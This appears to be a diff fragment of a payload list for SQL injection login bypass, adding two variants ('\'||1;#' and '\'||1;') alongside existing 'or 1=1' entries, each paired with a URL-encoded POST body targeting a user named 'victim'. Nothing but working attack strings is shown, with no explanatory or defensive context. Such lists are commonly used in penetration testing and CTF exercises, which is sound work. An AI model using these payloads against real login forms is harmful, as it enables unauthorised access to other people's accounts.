@@ -7,3 +7,9 @@ username=victim&password=%5C%27%27%20or%201%3D1%20--%20
 
 username=victim&password=%5C%27%27%27%27%20or%201%3D1%20--%20
 \'' or 1=1 -- 
+
+username=victim&password=%5C%27%27%7C%7C1%3B%23
+\'||1;#
+
+username=victim&password=%5C%27%27%7C%7C1%3B
+\'||1;
